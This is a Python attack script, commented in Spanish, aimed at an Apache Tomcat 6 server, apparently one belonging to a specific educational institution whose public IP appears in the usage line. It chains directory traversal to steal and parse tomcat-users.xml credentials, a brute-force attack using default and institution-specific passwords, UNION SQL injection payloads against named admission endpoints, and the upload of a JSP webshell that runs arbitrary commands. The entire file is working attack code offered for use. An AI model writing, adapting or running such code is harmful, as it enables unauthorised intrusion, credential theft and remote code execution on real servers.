import requests
import base64
import sys
from urllib.parse import urljoin
import xml.etree.ElementTree as ET

class Tomcat6Exploiter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        
    def directory_traversal_exploit(self):
        """Explotar Directory Traversal en Tomcat 6"""
        print("[+] Explotando Directory Traversal...")
        
        traversal_paths = {
            'tomcat-users.xml': [
                '/examples/jsp/include/include.jsp?page=../../../../conf/tomcat-users.xml',
                '/examples/jsp/cal/cal2.jsp?time=../../../../conf/tomcat-users.xml',
                '/examples/servlets/servlet/SessionExample?param=../../../../conf/tomcat-users.xml'
            ],
            'server.xml': [
                '/examples/jsp/include/include.jsp?page=../../../../conf/server.xml',
                '/examples/jsp/cal/cal2.jsp?time=../../../../conf/server.xml'
            ],
            'web.xml': [
                '/examples/jsp/include/include.jsp?page=../../../../WEB-INF/web.xml',
                '/examples/jsp/cal/cal2.jsp?time=../../../../webapps/manager/WEB-INF/web.xml'
            ]
        }
        
        for file_name, paths in traversal_paths.items():
            for path in paths:
                try:
                    url = urljoin(self.target, path)
                    r = self.session.get(url, timeout=10)
                    
                    if file_name in r.text and '<?xml' in r.text:
                        print(f"[CRITICAL] {file_name} EXPUESTO via: {path}")
                        
                        # Guardar archivo
                        with open(f"stolen_{file_name}", "w", encoding="utf-8") as f:
                            f.write(r.text)
                        print(f"[+] Archivo guardado como: stolen_{file_name}")
                        
                        if file_name == 'tomcat-users.xml':
                            self.parse_tomcat_users(r.text)
                        return r.text
                except Exception as e:
                    continue
        return None

    def parse_tomcat_users(self, xml_content):
        """Parsear tomcat-users.xml para extraer credenciales"""
        try:
            # Limpiar XML si es necesario
            xml_clean = xml_content.replace('<!--', '').replace('-->', '')
            root = ET.fromstring(xml_clean)
            
            print("\n[CREDENCIALES ENCONTRADAS]")
            for user in root.findall('.//user'):
                username = user.get('username')
                password = user.get('password')
                roles = user.get('roles')
                print(f"Usuario: {username} | Password: {password} | Roles: {roles}")
                
        except Exception as e:
            # Búsqueda manual de patrones
            import re
            users = re.findall(r'username="([^"]*)"\s+password="([^"]*)"\s+roles="([^"]*)"', xml_content)
            for user in users:
                print(f"Usuario: {user[0]} | Password: {user[1]} | Roles: {user[2]}")

    def jsp_samples_exploit(self):
        """Explotar ejemplos JSP vulnerables"""
        print("\n[+] Explotando JSP Samples...")
        
        jsp_samples = [
            '/examples/jsp/jsp2/tagfiles/hello.jsp',
            '/examples/jsp/include/include.jsp',
            '/examples/jsp/error/error.jsp',
            '/examples/jsp/snp/snoop.jsp'
        ]
        
        for sample in jsp_samples:
            try:
                url = urljoin(self.target, sample)
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"[+] JSP Sample accesible: {sample}")
            except:
                pass

    def webshell_upload_attempt(self):
        """Intentar subir webshell via métodos alternativos"""
        print("\n[+] Intentando upload de webshell...")
        
        webshell_jsp = '''<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = in.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
<form method="post">
CMD: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>'''
        
        # Intentar via PUT
        upload_paths = [
            '/webdav/shell.jsp',
            '/examples/webdav/shell.jsp',
            '/manager/put?path=/shell.jsp'
        ]
        
        for path in upload_paths:
            try:
                url = urljoin(self.target, path)
                r = self.session.request('PUT', url, data=webshell_jsp)
                if r.status_code in [200, 201, 204]:
                    print(f"[CRITICAL] Webshell subida: {url}")
                    return url
            except:
                continue
        return None

    def sql_injection_exploit(self):
        """Explotar SQL Injection en endpoints conocidos"""
        print("\n[+] Explotando SQL Injection...")
        
        endpoints = [
            '/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=',
            '/jsp/login.jsp?xUsuario=',
            '/jsp/index.jsp?yUsuario='
        ]
        
        # Payloads para extraer información de MySQL
        payloads = [
            "1' UNION SELECT user(),database(),version()--",
            "1' UNION SELECT table_name,table_schema,3 FROM information_schema.tables--",
            "1' UNION SELECT @@version,@@hostname,@@datadir--"
        ]
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    url = urljoin(self.target, endpoint + payload)
                    r = self.session.get(url, timeout=5)
                    
                    if r.status_code == 200 and 'error' not in r.text.lower():
                        print(f"[!] Respuesta inusual en: {endpoint}")
                        # Buscar datos en la respuesta
                        if 'root' in r.text or 'localhost' in r.text or 'mysql' in r.text.lower():
                            print("[CRITICAL] Posibles datos de DB encontrados!")
                except:
                    continue

    def brute_force_advanced(self):
        """Fuerza bruta avanzada con diccionario específico"""
        print("\n[+] Fuerza bruta avanzada...")
        
        # Combinaciones específicas para Tomcat educativo
        credentials = [
            ('admin', 'admin'), ('tomcat', 'tomcat'), 
            ('manager', 'manager'), ('admin', 'tomcat'),
            ('hnieto', 'utslp'), ('hnieto', 'hnieto'),
            ('admin', 'utslp'), ('sito', 'sito'),
            ('admin', 'sito'), ('root', 'root'),
            ('admin', 'password'), ('tomcat', 'admin'),
            ('both', 'tomcat'), ('role1', 'role1'),
            ('hnieto', 'password'), ('admin', '123456')
        ]
        
        for user, password in credentials:
            try:
                url = urljoin(self.target, '/manager/html')
                r = self.session.get(url, auth=(user, password), timeout=5)
                
                if r.status_code == 200 and 'Tomcat Web Application Manager' in r.text:
                    print(f"[CRITICAL] CREDENCIALES VÁLIDAS: {user}:{password}")
                    return (user, password)
                elif r.status_code == 401:
                    print(f"[-] Falló: {user}:{password}")
            except:
                continue
        return None

    def comprehensive_exploit(self):
        """Ejecutar todas las técnicas de explotación"""
        print("=== EXPLOTACIÓN COMPLETA TOMCAT 6.0.53 ===")
        print(f"Objetivo: {self.target}\n")
        
        # 1. Directory Traversal
        self.directory_traversal_exploit()
        
        # 2. Fuerza bruta
        self.brute_force_advanced()
        
        # 3. SQL Injection
        self.sql_injection_exploit()
        
        # 4. JSP Samples
        self.jsp_samples_exploit()
        
        # 5. Webshell
        self.webshell_upload_attempt()
        
        print("\n" + "="*50)
        print("EXPLOTACIÓN COMPLETADA")
        print("="*50)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python tomcat_exploit.py http://189.254.143.102")
        sys.exit(1)
    
    target = sys.argv[1]
    exploiter = Tomcat6Exploiter(target)
    exploiter.comprehensive_exploit()